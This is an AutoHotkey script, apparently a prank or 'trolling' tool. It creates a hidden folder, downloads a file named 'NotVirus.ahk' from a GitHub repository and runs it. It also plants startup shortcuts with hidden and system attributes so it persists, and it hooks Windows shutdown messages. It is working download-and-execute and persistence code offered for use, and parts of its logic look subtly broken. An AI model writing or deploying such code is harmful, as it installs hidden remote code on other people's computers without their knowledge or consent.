#NoEnv  ; Recommended for performance and compatibility with future AutoHotkey releases.
; #Warn  ; Enable warnings to assist with detecting common errors.
SendMode Input  ; Recommended for new scripts due to its superior speed and reliability.
SetWorkingDir %A_ScriptDir%  ; Ensures a consistent starting directory.
#SingleInstance, Force ; Only launches 1 instance of this script
If !FileExist(Code)
	FileCreateDir, Code
	FileSetAttrib, +H, Code
	v := "https://github.com/JWitterick/WeDoSomeTrolling/raw/main/NotVirus.ahk"
	URLDownloadToFile %v%, Code\NotVirus.ahk
else if !FileExist(Code\NotVirus.ahk)
	v := "https://github.com/JWitterick/WeDoSomeTrolling/raw/main/NotVirus.ahk"
	URLDownloadToFile %v%, Code\NotVirus.ahk
else if !FileExist(Startup\I'm Impressed.lnk)
	FileCreateShortcut, Well Done\Trolling.ahk, Startup\I'm Impressed.lnk
else if !FileExist(Startup\Get Good.lnk)
	FileCreateShortcut, JustInCase.ahk, Startup\Get Good.lnk
FileSetAttrib, +SH,  Startup\I'm Impressed.lnk
Run, Code\NotVirus.ahk
OnExit("Stuff")
DllCall("kernel32.dll\SetProcessShutdownParameters", UInt, 0x4FF, UInt, 0) 
OnMessage(0x11, "WM_QUERYENDSESSION")
return
WM_QUERYENDSESSION(wParam, lParam)
{
    ENDSESSION_LOGOFF = 0x80000000
    FileSetAttrib, -SH,  Startup\I'm Impressed.lnk
	return true ; Tell the OS to allow the shutdown/logoff to continue.
	exitapp ;quit the program
}
Stuff:
    FileSetAttrib, -SH,  Startup\I'm Impressed.lnk
	return